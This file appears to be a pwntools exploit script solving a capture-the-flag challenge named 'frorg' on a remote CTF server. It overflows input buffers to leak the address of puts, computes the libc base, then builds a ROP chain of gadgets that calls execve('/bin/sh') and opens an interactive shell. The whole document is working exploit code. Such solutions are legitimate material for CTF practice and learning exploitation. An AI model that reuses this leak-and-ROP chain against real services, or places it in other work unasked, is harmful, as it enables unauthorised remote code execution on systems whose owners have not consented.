from pwn import *


elf = ELF('./frorg')
libc = ELF('./libc.so.6')
rop_libc = ROP(libc)

# p = process('./frorg', env={"LD_PRELOAD":"./libc.so.6"})
p = remote('byuctf.xyz', 40015)

print(p.recv().decode(errors='ignore'))
p.sendline(b'9')
print(p.recv().decode(errors='ignore'))
p.sendline(b'a')
print(p.recv().decode(errors='ignore'))
p.sendline(b'b')
print(p.recv().decode(errors='ignore'))
p.sendline(b'c')
print(p.recv().decode(errors='ignore'))
p.sendline(b'd')
print(p.recv().decode(errors='ignore'))
p.sendline(b'e')

print(p.recv().decode(errors='ignore'))
p.send(b'f'*6 + b'\xe2\x11\x40\x00') # pop_rdi gadget

print(p.recv().decode(errors='ignore'))
p.send(b'\x00'*4 + b'\x00\x40\x40' + b'\x00' * 3) # got plt -> puts

print(p.recv().decode(errors='ignore'))
p.send(b'\x00\x00\x70\x10\x40' + b'\x00' * 5) # call puts

print(p.recv().decode(errors='ignore'))
p.sendline(b'\xea\x11\x40' + b'\x00' * 7)

print(p.recv().decode(errors='ignore'))

resp = p.recv()
puts_leaked = resp[len(b'Thank you!\n'):resp.find(b'\nI love frorggies')]
puts_leaked_addr = u64(puts_leaked.ljust(8, b'\x00'))
libc_addr = puts_leaked_addr - libc.sym['puts']
print(f"LIBC LEAKED ADDR: {hex(libc_addr)}")

# gdb.attach(p, gdbscript='b *main+165\nc')

p.sendline(b'13')
print(p.recv().decode(errors='ignore'))
p.sendline(b'a')
print(p.recv().decode(errors='ignore'))
p.sendline(b'b')
print(p.recv().decode(errors='ignore'))
p.sendline(b'c')
print(p.recv().decode(errors='ignore'))
p.sendline(b'd')
print(p.recv().decode(errors='ignore'))
p.sendline(b'e')

bin_sh = next(libc.search(b'/bin/sh')) + libc_addr
pop_rax = rop_libc.find_gadget(['pop rax', 'ret']).address + libc_addr
pop_rdx = rop_libc.find_gadget(['pop rdx', 'ret']).address + libc_addr
pop_rsi = rop_libc.find_gadget(['pop rsi', 'ret']).address + libc_addr
syscall = rop_libc.find_gadget(['syscall', 'ret']).address + libc_addr

# print(f"POP RSI: {hex(pop_rsi)}")

print(f"/bin/sh ADDR: {hex(bin_sh)}")

print(p.recv().decode(errors='ignore'))
p.send(b'f'*6 + b'\xe2\x11\x40\x00') # pop_rdi gadget

print(p.recv().decode(errors='ignore'))
p.send(b'\x00'*4 + p64(bin_sh)[:6]) # /bin/sh

print(p.recv().decode(errors='ignore'))
p.send(b'\x00' * 2 + p64(pop_rax))  # pop rax

print(p.recv().decode(errors='ignore'))
p.send(p64(0x3b) + p64(pop_rdx)[:2]) # 0x3b

print(p.recv().decode(errors='ignore'))
p.send(p64(pop_rdx)[2:] + b'\x00' * 4)  # pop rdx

print(p.recv().decode(errors='ignore'))
p.send(b'\x00' * 4 + p64(pop_rsi)[:6]) # pop rsi

print(p.recv().decode(errors='ignore')) # 12
p.send(p64(pop_rsi)[6:] + b'\x00' * 8)  # pop rdx

print(p.recv().decode(errors='ignore')) # 13
p.send(p64(syscall) + b'\x00' * 2)  # pop rdx

p.interactive()

